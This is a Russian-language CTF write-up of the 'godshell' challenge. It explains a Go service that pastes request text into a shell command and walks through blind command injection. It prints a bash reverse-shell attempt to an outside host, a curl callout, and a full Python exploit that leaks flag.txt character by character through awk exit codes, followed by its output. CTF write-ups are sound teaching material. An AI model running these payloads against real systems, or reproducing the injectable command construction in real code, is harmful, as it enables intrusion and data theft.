# itstinkoff-2023/godshell

## Сервис: первое впечатление

Заходим на страничку сервиса.

![сайт сервиса: слова "Human, ask me a question", текстовое поле со строкой "fffffffffff", синяя кнопка "Send", под ней зелёное сообщение "This question has been added to the processing queue"](site.png)

С виду и непонятно, что происходит. Можно ввести какую-то строку и отправить её на сервер. Тут можно заметить, что если ввести строку с `"`, то сервер вернёт ошибку.

![опять сайт сервиса, но в поле для ввода кавычка, зелёное сообщение сменилось красным с текстом "Failed to add question"](site-error.png)

## Смотрим исходники

Качаем архив с исходниками. В `main.go` наблюдаем следующее:

```go
cmdString := `echo -n "` + string(decodedData) + `" | od -An -t dC | awk '{ for (i=1; i<=NF; i++) printf "%d\n", ($i*$i+$i)%256 }' | shuf | awk 'BEGIN{srand();} {x=0; for(i=1;i<=NF;i++){x+=sqrt($i*rand())%$1} print x}' > /dev/null`
```

Ага. Поэтому с кавычкой запросы и сыпались. Здесь просто подставляется в команду строка из тела запроса.

Отлично, значит, можно устроить Command Injection и выполнить произвольную команду, отправив что-то типа:

```
"; whoami #
```

К сожалению, сервер не возвращает ответ, так что мы можем только понять, успешна команда или провальна:

```go
err = cmd.Run()
if err != nil {
    http.Error(w, "", http.StatusBadRequest)
    return
}

w.WriteHeader(http.StatusOK)
```

## .где я

Примерно так выглядели мои следующие попытки выполнять команды:

```
bash -c "bash -i >& /dev/tcp/altau.site/9001 0>&1" -- fail
curl http://altau.site:9001 -- fail
whoami -- success
bash -c "whoami" -- fail
sh -c "whoami" -- success
which bash -- fail
ping altau.site -- fail
which ping -- fail
which telnet -- fail
```

А почему? А потому что надо было читать Dockerfile.

```Dockerfile
FROM debian:9-slim
...
ARG USER=app
...
ARG BINDEL=bash
...
RUN /bin/sh -c "rm /bin/${BINDEL}"
...
COPY index.html flag.txt ${DIR}/
RUN chmod 444 index.html flag.txt

# We don't want the computer to become too powerful
RUN rm /usr/bin/perl /usr/bin/perl5.24.1
...
USER ${USER}
```

Нас заперли в отдельном пользователе в порезанном Debian'е, а также удалили `bash` и `perl`. В качестве оболочки используется `dash`.

## Танцы с `awk`ом

Ну что ж, ладно. У нас остаётся старый добрый `awk`. Но он всё ещё не может ничего выводить... Но может возвращать код ошибки.

Как на `awk` будет "узнать, находится ли в заданном интервале Nй символ первой строки файла, и вернуть статус в соответствии с этим"?

```sh
awk 'BEGIN{exitCode=1} NR==1{if(substr($0,1,1) ~ /i/) exitCode=0; exit exitCode}' file.txt
```

Я не настоящий сварщик, но это работает.

С этим можно написать эксплойт, который будет отправлять на сервер запросы с разными интервалами, в которых могут быть символы:

```python
#!/usr/bin/env python3
import string
import requests

RANGES = (string.ascii_lowercase, string.ascii_uppercase, string.digits, string.punctuation, string.whitespace)
URL = "https://its-godshell-gze55elc.spbctf.ru/question"
LINENUM = 1

def determine_range(i):
    for range in RANGES:
        payload = bytes(f"\"; awk 'BEGIN{{exitCode=1}} NR=={LINENUM}{{if(substr($0,{i},1) ~ /[{range[0]}-{range[-1]}]/) exitCode=0; exit exitCode}}' /home/app/flag.txt #", encoding="ascii")
        rsp = requests.post(URL, data=payload)
        if rsp.status_code == 200:
            return range
        
def binsearch(i, range):
    start, end = 0, len(range) - 1
    while start < end:
        mid = (start + end) // 2
        print(f"Trying binsearch: {start}, {mid}, {end}")
        payload = bytes(f"\"; awk 'BEGIN{{exitCode=1}} NR=={LINENUM}{{if(substr($0,{i},1) ~ /[{range[start]}-{range[mid]}]/) exitCode=0; exit exitCode}}' /home/app/flag.txt #", encoding="ascii")
        rsp = requests.post(URL, data=payload)
        if rsp.status_code == 200:
            end = mid
        else:
            start = mid + 1
    return range[start]

def bruteforce(i, range):
    for char in range:
        print(f"Trying bruteforce: {char}")
        if char in "'\"": # problematic AF
            continue
        payload = bytes(f"\"; awk 'BEGIN{{exitCode=1}} NR=={LINENUM}{{if(substr($0,{i},1) == \"{char}\") exitCode=0; exit exitCode}}' /home/app/flag.txt #", encoding="ascii")
        rsp = requests.post(URL, data=payload)
        if rsp.status_code == 200:
            return char
    return "?"

def main():
    flag = ""
    i = 1
    while True:
        range = determine_range(i)
        if range is None:
            print("Done")
            break
        print(f"Range for {i} is {range}")
        if range != string.punctuation:
            foundChar = binsearch(i, range)
        else:   # regex can be funny with special chars
            foundChar = bruteforce(i, range)
        flag += foundChar
        print(f"Found char for {i} is {foundChar}")
        i += 1
    print(f"Flag is {flag}")

if __name__ == "__main__":
    main()
```

`awk` обрабатывает файлы построчно, но не страшно, потому что флаг наверняка в первой и единственной строке, да? Нет:

```
...
Done
Flag is On
          the
             second
                   line'
                        kek
```

Ну ладно, поменяем `LINENUM` на 2 и запустим ещё раз:

```
...
Done
Flag is its{Th3_An5weR_oF_3VeRy7hiN6_1S_f0rTy_7hRE3_d0Nt_5Ue_U5_pL34sE}
```

gg.
